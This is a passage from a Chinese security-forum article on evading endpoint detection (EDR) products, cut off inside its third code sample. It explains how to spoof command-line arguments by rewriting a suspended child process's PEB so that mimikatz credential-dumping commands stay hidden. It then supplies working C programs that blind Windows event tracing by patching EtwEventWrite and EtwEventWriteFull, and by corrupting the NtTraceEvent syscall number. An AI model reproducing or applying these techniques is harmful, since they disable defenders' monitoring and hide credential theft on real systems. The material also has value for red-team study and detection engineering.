---
title: 从EDR特性出发到对抗EDR
url: https://forum.butian.net/share/4160
source: 奇安信攻防社区
date: 2025-02-25
fetch_date: 2025-10-06T20:32:54.361637
---

# 从EDR特性出发到对抗EDR

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 从EDR特性出发到对抗EDR

* [渗透测试](https://forum.butian.net/topic/47)

大家可能都了解``EDR``的一些特性，包括一些内存扫描，用户态挂钩，调用堆栈分析以及签名扫描等等。这一节我们将来看看如何对抗``EDR``。

##### 命令行参数欺骗
`EDR`通过大量的传感器来接收事件，这些传感器的可信度是各不相同的。此外，许多与进程相关的重要信息并不会直接包含在事件数据中。而是需要从内核或进程的内存空间中去获取。
例如: `PEB`: `PEB`中包含了命令行参数以及父进程的`ID`等信息。
很多针对`EDR`的攻击都是依赖于`TOCTOU`漏洞，该漏洞为检查时刻与使用时刻之间的时间差，这意味着`EDR`在检查某个事件时，可能会基于旧数据进行决策。攻击者可以在事件被检测之后，被使用之前，修改关键数据，从而绕过安全检查。
什么意思呢？`TOCTOU`漏洞其实就是检查时间和使用时间的间隔，其实就是一种竞态条件漏洞。指的是系统在检查某个资源时和实际使用该资源之间的事件间隔。攻击者可以在该时间间隔来修改资源，从而绕过。
我们来举一个例子:
进程启动之后，`EDR`可能会检查其`PEB`结构中的命令行参数，攻击者可以利用`EDR`检测之后来修改`PEB`中的命令行参数，改变程序的行为。`EDR`可能记录了启动时的参数，但执行时参数已经发生变化，导致检测失效。
`EDR`可以通过进程启动时的参数来判断是否是恶意行为。比如我们使用`mimikatz.exe`来导出凭据的时候，可能会使用`mimikatz.exe "privilege::debug" "lsadump::sam"`该命令。
即使攻击者将`mimikatz.exe`修改为`notepad.exe`或者一些合法且正常程序的名称，但是命令行参数依然会暴露出恶意的行为。
那么`EDR`是如何去检测命令行的呢？`EDR`可以监控新进程的命令行参数，在`Windows`上可以使用`Event ID 4688`来捕获进程启动时的完整命令行。
`EDR`维护了一个已知恶意参数的列表，比如`"privilege::debug"、"sekurlsa::logonpasswords"`，如果发现这些关键字就会触发警报。
而在`Windows`中命令行参数是可以伪造的，进程的命令行参数是存储在`PEB`中的，攻击者可以在进程启动后去修改`PEB->ProcessParameters->CommandLine`，从而伪造命令行参数。
如果使用`CreateProcess`函数，在启动新进程时会包含初始的参数，但是这些参数是不会被内核强制验证的，攻击者可以利用不同的方式来伪造或隐藏真实的参数。
`Windows`进程的命令行参数主要存储在两个地方:
1. 当进程启动时，它的命令行参数会存储在`PEB`中，`PEB->ProcessParameters->CommandLine`，攻击者可以在进程启动后来修改这个值，从而伪造命令行参数。
2. 在`Windows`中，父进程创建子进程时，通常会调用`CreateProcess`函数，该函数可以指定初始化的参数。
由于`PEB`可被进程自身来进行更改，所以其中的数据是不可信的，但是`EDR`在查询进程的命令行时，通常会直接信任`PEB`中的`CommandLine`，这可能导致被攻击者伪造或隐藏真实参数绕过。
当父进程调用`CreateProcess`来创建一个子进程时，操作系统会启动新的子进程。`CreateProcess`函数会接收命令行参数，比如启动子进程时传递的文件名以及命令，并将这些参数保存到进程的`PEB`中。`EDR`可以通过监控`CreateProcess`事件并检查命令行参数来检测潜在的恶意行为。但是攻击者可以通过如下来绕过`EDR`:
1. 父进程首先创建一个挂起状态的子进程，首先传递虚假的命令行参数。
2. `EDR`捕获到进程事件时，会看到虚假的命令行参数。
3. 父进程随后修改子进程的`PEB`，将真实的命令行参数写入到其中，然后继续启动子进程。
我们来拿上几节的参数欺骗举例子:
如下可以看到成功欺骗了该`Process Hacker`。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/02/attach-9aa74e30382a8113853664fa35d7db57865de778.png)
成功欺骗`Sysmon`。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/02/attach-6c373ca2d58852dbd98fd7864db32f96b5b5bca5.png)
##### Bypass ETW
`ETW`是一种`Windows`内核和应用程序级的事件跟踪机制，允许捕获系统运行时的事件，`EtwEventWrite`函数是用于生成这些事件的函数。当恶意软件或攻击者希望隐藏进程的活动或避免监控时，他们可能会使用`ETW`补丁技术来拦截或修改`EtwEventWrite`函数，从而阻止进程生成`ETW`事件。
有几个函数是用于写入和记录`ETW`事件的。分别为`EtwEventWrite`，`EtwEventWriteFull`，`EtwEventWriteTransfer`函数。
我们可以在这三个目标函数的开头去插入一个`ret`的指令，那么当这三个函数被调用时，执行就会立即返回给调用者，而无需运行原始函数的代码逻辑。
也就是说我们只需要在`EtwEventWrite`函数的开头去插入`xor eax,eax`指令，将其返回值设置为零，然后插入`ret`指令，使函数立即返回即可。
那么接下来修补就很简单了，我们只需要获取到`EtwEventWrite`以及`EtwEventwriteFull`函数的基址，然后修改其内存保护权限为`RWX`，最后将我们的指令插入进去即可。
代码这里有一个简单的例子:
```c
#include <windows.h>
#include <stdio.h>
#include <evntprov.h>
typedef enum {
PATCH\_ETW\_EVENTWRITE,
PATCH\_ETW\_EVENTWRITE\_FULL
} PATCH;
unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
void\* GetTargetFunction(PATCH patchType) {
if (patchType == PATCH\_ETW\_EVENTWRITE) {
return GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
}
else if (patchType == PATCH\_ETW\_EVENTWRITE\_FULL) {
return GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWriteFull");
}
return NULL;
}
void PatchwWriteFunc(PATCH patchType) {
void\* targetFunction = GetTargetFunction(patchType);
if (targetFunction == NULL) {
printf("目标函数地址获取失败\n");
return;
}
DWORD oldProtect;
if (!VirtualProtect(targetFunction, sizeof(patch), PAGE\_EXECUTE\_READWRITE, &oldProtect)) {
printf("无法修改内存保护属性\n");
return;
}
memcpy(targetFunction, patch, sizeof(patch));
VirtualProtect(targetFunction, sizeof(patch), oldProtect, &oldProtect);
printf("address : 0x%p ", targetFunction);
printf("修补成功\n");
}
int main() {
PatchwWriteFunc(PATCH\_ETW\_EVENTWRITE);
getchar();
return 0;
}
```
我们可以从`x64dbg`中得知已经插入成功了。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/02/attach-ef6bb2d573bb01a6145a233936e9777d378859d4.png)
需要注意的是虽然我们成功修补了该函数，但是由于常见的用户态`ETW`事件其实并不多，所以它的实际作用也不会那么显著。
还有一个函数是`NtTraceEvent`函数，该函数不仅会被`EtwEventWrite`和`EtwEventWriteFull`函数调用，还会被其他的`Etw`相关的函数调用，所以我们要修补该函数。那么我们也可以通过上面的方式来进行修改，这里还有另外一种方式就是通过修改`SSN`编号来达到调用失败的目的，我们可以将其`NtTraceEvent`函数的`SSN`编号修改为`FF`，它就无法调用了。
那么首先需要找到该函数的`SSN`编号，最后通过`VirtualProtect`修改内存保护权限，然后将我们的`SSN`编号写进去即可。
```c
#include <windows.h>
#include <stdio.h>
#include <evntprov.h>
typedef enum {
PATCH\_NT\_TRACE\_EVENT,
PATCH\_ETW\_EVENTWRITE,
PATCH\_ETW\_EVENTWRITE\_FULL
} PATCH;
unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
void\* GetTargetFunction(PATCH patchType) {
switch (patchType) {
case PATCH\_NT\_TRACE\_EVENT:
return GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
case PATCH\_ETW\_EVENTWRITE:
return GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
case PATCH\_ETW\_EVENTWRITE\_FULL:
return GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWriteFull");
default:
return NULL;
}
}
// 修补 NtTraceEvent 的 SSN
void PatchNtTraceEventSSN() {
// 获取 NtTraceEvent 函数地址
void\* targetFunction = GetTargetFunction(PATCH\_NT\_TRACE\_EVENT);
if (targetFunction == NULL) {
printf("目标函数地址获取失败\n");
return;
}
// 搜索 B8 操作码，类似于 mov eax 指令
unsigned char\* functionStart = (unsigned char\*)targetFunction;
unsigned char\* functionEnd = functionStart + 0x20; // 假设函数前20字节包含 SSN
for (unsigned char\* p = functionStart; p < functionEnd; ++p) {
if (\*p == 0xB8) { // 找到 mov eax 操作码
DWORD oldProtect;
if (!VirtualProtect(p, 6, PAGE\_EXECUTE\_READWRITE, &oldProtect)) {
printf("无法修改内存保护属性\n");
return;
}
// 修改 SSN 为 0xFF（无效值）
\*(DWORD\*)(p + 1) = 0xFF;
// 恢复内存保护属性
VirtualProtect(p, 6, oldProtect, &oldProtect);
printf("修补成功\n");
return;
}
}
printf("未找到 B8 操作码\n");
}
int main() {
PatchNtTraceEventSSN();
getchar();
return 0;
}
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/02/attach-ac5723cff2f350d0f5e96eabd042acd1e0705e7f.png)
那么我们再看观察一下`EtwEventWrite` `EtwEventWriteFull` `EtwEventWriteEx`函数。
我们会发现这三个函数最终都会调用到`0x7FFC217C00B4`这个地址。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/02/attach-2baa373a25b580423c4c1bd154d5599a51a7741f.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/02/attach-65e530b9f467cd579bc6f3f48412f4e15e92b2e3.png)
那么该地址其实对应的是`EtwpEventWirteFull`函数，但是该函数是在`x64dbg`中看不到的，我们可以在`Ida`中查看，这里我就不给大家看了，大家可以自行去查看。
那么我们就可以修补该函数来达到`Bypass Etw`的效果。我们可以直接将其`call`指令替换为`nop`指令。`call`指令是`1`个字节，那么后面如果跟地址的话，地址是4个字节，也就是说我们如果想要去替换`call`指令，那么至少肯定是需要`5`个字节的。`nop`指令的操作码是`90`。
如下代码:
```c
#include <windows.h>
#include <stdio.h>
// 定义各种指令的操作码
#define x64\_CALL\_INSTRUCTION\_OPCODE 0xE8 // CALL 指令的操作码
#define x64\_RET\_INSTRUCTION\_OPCODE 0xC3 // RET 指令的操作码
#define x64\_INT3\_INSTRUCTION\_OPCODE 0xCC // INT3 指令的操作码 (用于断点)
#define NOP\_INSTRUCTION\_OPCODE 0x90 // NOP 指令的操作码 (空操作)
#define PATCH\_SIZE 0x05 // 补丁大小，5 字节
// 定义补丁类型的枚举，用于指定要修补的函数
enum PATCH {
PATCH\_NT\_TRACE\_EVENT, // NtTraceEvent (示例中未使用)
PATCH\_ETW\_EVENTWRITE, // EtwEventWrite
PATCH\_ETW\_EVENTWRITE\_FULL // EtwEventWriteFull
};
// 函数声明
void\* GetTargetFunction(enum PATCH patchType);
BOOL PatchCallInstruction(void\* pFunction);
// 获取目标函数的地址，根据不同的补丁类型
void\* GetTargetFunction(enum PATCH patchType) {
switch (patchType) {
case PATCH\_ETW\_EVENTWRITE:
// 获取 "ntdll.dll" 模块中的 "EtwEventWrite" 函数地址
return GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
case PATCH\_ETW\_EVENTWRITE\_FULL:
// 获取 "ntdll.dll" 模块中的 "EtwEventWriteFull" 函数地址
return GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWriteFull");
default:
// 如果没有匹配的补丁类型...